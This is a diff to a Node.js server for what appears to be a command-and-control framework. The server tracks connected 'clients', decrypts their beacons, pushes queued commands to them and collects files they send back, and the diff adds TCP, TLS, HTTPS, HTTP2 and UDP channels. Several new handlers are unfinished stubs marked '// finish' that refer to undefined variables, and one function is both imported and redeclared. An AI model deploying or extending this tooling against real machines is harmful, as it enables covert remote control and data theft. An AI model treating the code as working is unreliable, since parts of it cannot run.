@@ -19,15 +19,15 @@
  *    LICENSE: GPL-3.0
  */
 //  ------------------------------------- VARIABLES -------------------------------------
-import { createServer } from 'node:net';
+const { log, logInfo, logError, logSuccess, createLogStream } = require('./utils/logging');
+const { getUptime, displayCommandOptions, getHowel, getStartup, displayActivePlugins } = require('./utils/helpers');
+const { encryptData, decryptData, getSessionId } = require('./utils/encdec');
+const { startInputListener } = require('./utils/readline');
+const { handleResponse, handleBeacon, handleDownloadResponse } = require('./utils/handlers');
+const { setClientActive, showClient, showActiveClients, executeQueuedCommands } = require('./utils/clients');
+const { loadAndRegisterPlugins } = require('./utils/plugins');
 
-import { log, logInfo, logError, logSuccess, createLogStream } from './utils/logging';
-import { getUptime, displayCommandOptions, getHowel, getStartup, displayActivePlugins } from './utils/helpers';
-import { encryptData, decryptData, getSessionId } from './utils/encdec';
-import { startInputListener } from './utils/readline';
-import { handleResponse, handleBeacon, handleDownloadResponse } from './utils/handlers';
-import { setClientActive, showClient, showActiveClients, executeQueuedCommands } from './utils/clients';
-import { loadAndRegisterPlugins } from './utils/plugins';
+const config = require('./config/configLoader');
 
 const activeClients = new Map();
 const queuedCommands = new Map();
@@ -114,7 +114,7 @@ const handleServerCommand = async (command, properties, logStream) => {
                 }
             }
         }
-        await rl.prompt();
+        rl.prompt();
     } catch (error) {
         logError(`Exception: ${error.message}`, logStream);
     }
@@ -170,6 +170,26 @@ const executeClientCommand = async (client, command) => {
 };
 
 /**
+ * Execute the queued command on a client
+ * @param {*} client 
+ * @param {*} queuedCommands 
+ * @param {*} logStream 
+ */
+const executeQueuedCommands = async (client, queuedCommands, logStream) => {
+    if (!client || !client.sessionId) {
+        throw new Error('No active session ID set.');
+    }
+    const commands = queuedCommands.get(client.sessionId);
+    if (commands) {
+        commands.forEach(async ({ command, args }) => {
+            await executeClientCommand(client, `${command} ${args.join(' ')}`);
+            logInfo(`Queued client command executed: ${command} ${args.join(' ')}`, logStream);
+        });
+        queuedCommands.delete(client.sessionId);
+    }
+};
+
+/**
  * Sends the client command
  * @param {*} command 
  * @param {*} args 
@@ -217,92 +237,195 @@ const closeServer = () => {
 /**
  * Creates the server connection for net.Socket
  */
-server = createServer((socket) => {
-    const ipAddress = socket.address().address.replace("::ffff:","");
-    const sessionId = getSessionId(ipAddress)
-    let client = activeClients.get(sessionId);
-    if (!client) {
-        client = {
-            sessionId: sessionId,
-            socket: socket,
-            address: ipAddress,
-            lastSeen: new Date(),
-            active: true,
-            buffer: '',
-            waiting: false,
-            version: null,
-            type: null,
-            platform: null, 
-            arch: null, 
-            osver: null, 
-            hostname: null
-        };
-        activeClients.set(sessionId, client);
-    } else {
-        client.active = true;
-        client.socket = socket;
-        client.lastSeen = (new Date()).getDate();
-    }
-    socket.on('data', async (payload) => {
-        try {
-            if (payload.length >= data.chunk_size || payload.includes('--FIN--')) {
-                // chunk mode
-                client.waiting = true;
-                client.buffer += payload;
-                if (client.buffer.includes('--FIN--')) {
-                    const bufferChunks = client.buffer.replace('--FIN--', '');
-                    const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
+const startSocketServer = () => {
+    const { createServer } = require('node:net');
+
+    server = createServer((socket) => {
+        const ipAddress = socket.address().address.replace("::ffff:","");
+        const sessionId = getSessionId(ipAddress)
+        let client = activeClients.get(sessionId);
+        if (!client) {
+            client = {
+                sessionId: sessionId,
+                socket: socket,
+                address: ipAddress,
+                lastSeen: new Date(),
+                active: true,
+                buffer: '',
+                waiting: false,
+                version: null,
+                type: null,
+                platform: null, 
+                arch: null, 
+                osver: null, 
+                hostname: null
+            };
+            activeClients.set(sessionId, client);
+        } else {
+            client.active = true;
+            client.socket = socket;
+            client.lastSeen = (new Date()).getDate();
+        }
+        socket.on('data', async (payload) => {
+            try {
+                if (payload.length >= config.data.chunk_size || payload.includes('--FIN--')) {
+                    // chunk mode
+                    client.waiting = true;
+                    client.buffer += payload;
+                    if (client.buffer.includes('--FIN--')) {
+                        const bufferChunks = client.buffer.replace('--FIN--', '');
+                        const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
+                        const parsed = JSON.parse(decrypted);
+                        const response = parsed.response;
+                        if (response.download) {
+                            await handleDownloadResponse(response, logStream);
+                        } else {
+                            handleResponse(response, logStream);
+                        }
+                        client.waiting = false;
+                        client.buffer = '';
+                    }
+                } else {
+                    // non-chunk mode
+                    const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
                     const parsed = JSON.parse(decrypted);
                     const response = parsed.response;
-                    if (response.download) {
-                        await handleDownloadResponse(response, logStream);
+                    if (response.beacon) {
+                        handleBeacon(response, client, logStream);
+                        await executeQueuedCommands(client, queuedCommands, logStream);
+                    } else if (response.download) {
+                        await handleDownloadResponse(response, client.sessionId, logStream);
+                    } else if (response.error) {
+                        logError(response.error, logStream);
                     } else {
                         handleResponse(response, logStream);
                     }
-                    client.waiting = false;
-                    client.buffer = '';
                 }
-            } else {
-                // non-chunk mode
-                const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
-                const parsed = JSON.parse(decrypted);
-                const response = parsed.response;
-                if (response.beacon) {
-                    handleBeacon(response, client, logStream);
-                    await executeQueuedCommands(client, queuedCommands, logStream);
-                } else if (response.download) {
-                    await handleDownloadResponse(response, client.sessionId, logStream);
-                } else if (response.error) {
-                    logError(response.error, logStream);
-                } else {
-                    handleResponse(response, logStream);
-                }
+            } catch(err) {
+                logError(err.message, logStream);
             }
-        } catch(err) {
-            logError(err.message, logStream);
-        }
+        });
+        socket.on('end', () => {
+            logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
+            if (client) {
+                client.lastSeen = new Date();
+                client.active = false;
+            }
+        });
+        socket.on('error', (err) => {
+            logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
+            if (client) {
+                client.active = false;
+            }
+        });
     });
-    socket.on('end', () => {
-        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
-        if (client) {
-            client.lastSeen = new Date();
-            client.active = false;
-        }
+};
+
+const startTLSServer = () => {
+    const tls = require('node:tls');
+
+    server = tls.createServer({
+        key: fs.readFileSync(path.join(__dirname, 'server.key')),
+        cert: fs.readFileSync(path.join(__dirname, 'server.cert')),
+    }, (socket) => {
+        // finish
+        socket.on('end', () => {
+            logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
+            if (client) {
+                client.lastSeen = new Date();
+                client.active = false;
+            }
+        });
+        socket.on('error', (err) => {
+            logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
+            if (client) {
+                client.active = false;
+            }
+        });
     });
-    socket.on('error', (err) => {
-        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
-        if (client) {
-            client.active = false;
-        }
+};
+
+const startHTTPSServer = () => {
+    const https = require('node:https');
+
+    server = https.createServer({
+        key: fs.readFileSync(path.join(__dirname, 'server.key')),
+        cert: fs.readFileSync(path.join(__dirname, 'server.cert')),
+    }, (socket) => {
+        // finish
+        socket.on('end', () => {
+            logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
+            if (client) {
+                client.lastSeen = new Date();
+                client.active = false;
+            }
+        });
+        socket.on('error', (err) => {
+            logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
+            if (client) {
+                client.active = false;
+            }
+        });
     });
-});
+};
+
+const startHTTP2Server = () => {
+    const http2 = require('node:http2');
+
+    server = http2.createSecureServer({
+        key: fs.readFileSync(path.join(__dirname, 'server.key')),
+        cert: fs.readFileSync(path.join(__dirname, 'server.cert')),
+    }, (req, res) => {
+        // finish
+    });
+};
+
+const startUDPServer = () => {
+    const dgram = require('dgram');
+
+    const controller = new AbortController();
+    const { signal } = controller;
+
+    let chunkSize = config.data.chunk_size + 1;
+    server = dgram.createSocket({ 
+        type: config.channels.udp.type, 
+        recvBufferSize: chunkSize, 
+        sendBufferSize: chunkSize,
+        signal
+    }, (msg, rinfo) => {
+        // finish
+    });
+};
+
+// ----------------------- START SERVER -------------------------
+
+switch (config.server.method) {
+    case "tcp":
+        startSocketServer();
+        break;
+    case "tls":
+        startTLSServer();
+        break;
+    case "https":
+        startHTTPSServer();
+        break;
+    case "http2":
+        startHTTP2Server();
+        break;
+    case "udp":
+        startUDPServer();
+        break;
+    default:
+        // default to tcp socket
+        startSocketServer();
+}
 
 server.on('error', (err) => {
     logError(`\nServer threw an error: ${err.message}`, logStream);
     closeServer();
 });
 
-server.listen(_server.port, _server.host, async () => {
+server.listen(config.channels.tcp.port, config.server.host, async () => {
     // create log
     logStream = await createLogStream();
 
@@ -323,7 +446,7 @@ server.listen(_server.port, _server.host, async () => {
                 rl.prompt();
                 return;
             }
-            if (logging.enabled && logStream) {
+            if (config.logging.enabled && logStream) {
                 logStream.write(`Enter command > ${command}\n`);
             }
             // handle the command
@@ -335,6 +458,7 @@ server.listen(_server.port, _server.host, async () => {
     rl.prompt();
 });
 
+// SIGTERM/SIGINT
 const shutdown = () => {
     logInfo('Server is shutting down...', logStream);
     server.close(() => {
